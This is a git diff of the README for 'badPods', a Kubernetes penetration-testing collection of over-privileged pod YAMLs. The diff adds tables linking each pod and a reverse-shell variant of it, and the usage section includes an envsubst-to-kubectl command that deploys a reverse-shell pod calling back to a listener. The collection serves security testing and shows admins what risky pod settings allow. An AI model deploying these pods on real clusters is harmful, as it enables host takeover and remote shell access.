@@ -1,6 +1,6 @@
 # badPods
 
-A collection of yamls that will create pods with different elevated privileges. The goal is to help you quickly understand the impact of allowing specific security sensitive pod specifications, and some common combinations, by giving you the tools to demonstrate exploitation.
+A collection of easy to use pod yamls with different elevated privileges. The goal is to help you quickly understand the impact of allowing specific security sensitive pod specifications by giving you the tools to demonstrate exploitation.
 
 ## Background
 Occasionally, containers within pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications, but it is not always clear what the real-world security implications of allowing certain attributes is. 
@@ -13,7 +13,31 @@ In order to be successful in this attack path, you'll need the following:
 1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all
 
 
-## Summary
+# Pods
+
+Notes | type| yaml | readme
+-- | -- | -- | --
+Everything allowed| pod | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [readme](yaml/everything-allowed/README.md)
+Privileged and hostPid | pod | [yaml](yaml/priv-and-hostpid/README.md) | [readme](yaml/priv-and-hostpid/README.md)
+Privileged only | pod | [yaml](yaml/priv-only/pod-priv-only.yaml) | [readme](yaml/priv-only/README.md)
+hostPid only | pod | [yaml](yaml/hostpid-only/pod-hostpid-only.yaml) | [readme](yaml/hostpid-only/README.md)
+hostNetwork only | pod | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only.yaml) | [readme](yaml/hostnetwork-only/README.md)
+hostIPC only | pod | [yaml](yaml/hostipc-only/pod-hostipc-only.yaml) | [readme](yaml/hostipc-only/README.md)
+
+## Reverse shell versions of each pod
+
+Notes | type| yaml | readme
+-- | -- | -- | --
+Everything allowed - reverse shell| pod | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml) |  [readme](yaml/everything-allowed/README.md)
+Privileged and hostPid - reverse shell | pod | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml) | [readme](yaml/priv-and-hostpid/README.md)
+Privileged only - reverse shell| pod | [yaml](yaml/priv-only/pod-priv-only-revshell.yaml) | [readme](yaml/priv-only/README.md)
+hostPid only - reverse shell | pod | [yaml](yaml/hostipc-only/pod-hostipc-only-revshell.yaml) | [readme](yaml/hostpid-only/README.md)
+hostNetwork only - reverse shell | pod | [yaml](yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml) | [readme](yaml/hostnetwork-only/README.md)
+hostIPC only - reverse shell | pod | [yaml](yaml/hostipc-only/README.md) | [readme](yaml/hostipc-only/README.md)
+
+ 
+
+## Impact - What's the worst that can happen?
 
 Allowed Specification | What's the worst that can happen? | How?
 -- | -- | -- 
@@ -27,6 +51,9 @@ Allowed Specification | What's the worst that can happen? | How?
 
 
 **Caveat:** There are many kubernetes specific security controls available to administrators that can reduce the impact of pods created with the following privileges. As is always the case with penetration testing, your milage may vary.
+
+
+
 
 
 ## Usage
@@ -50,7 +77,7 @@ kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
 ```
 
 ### Reverse Shells
-If you are in a position where you can create pods but not exec into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:
+If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:
 
 ```bash
 HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
@@ -93,3 +120,6 @@ root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c 
 ```
 kubectl  delete -f pod-hostpid-only.yaml 
 ```
+
+# Acknowledgements 
+
